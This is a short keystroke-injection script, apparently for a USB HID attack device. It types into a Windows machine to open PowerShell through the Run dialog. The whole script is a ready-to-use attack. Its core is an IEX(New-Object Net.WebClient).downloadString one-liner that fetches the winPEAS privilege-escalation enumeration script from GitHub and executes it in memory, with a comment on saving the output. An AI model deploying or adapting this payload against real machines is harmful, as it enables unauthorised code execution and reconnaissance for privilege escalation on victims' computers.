/*
Start Powershell. Use DownloadString and run winPEAS.ps1 to stdout, or file.
winPEAS.ps1 by peass-ng 
author: Klau5t4ler0x90
*/

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Execute winPEAS.ps1 from Web over IEX and execute
// Saving the results? Add " | Out-File c:\\temp\\winpwas_results.txt" or something like that
function loadWinPeas() {
  type("IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')")
  press("ENTER");
}

layout('de');			// DE keyboard layout
fast();

startPS();
delay(500);
loadWinPeas();
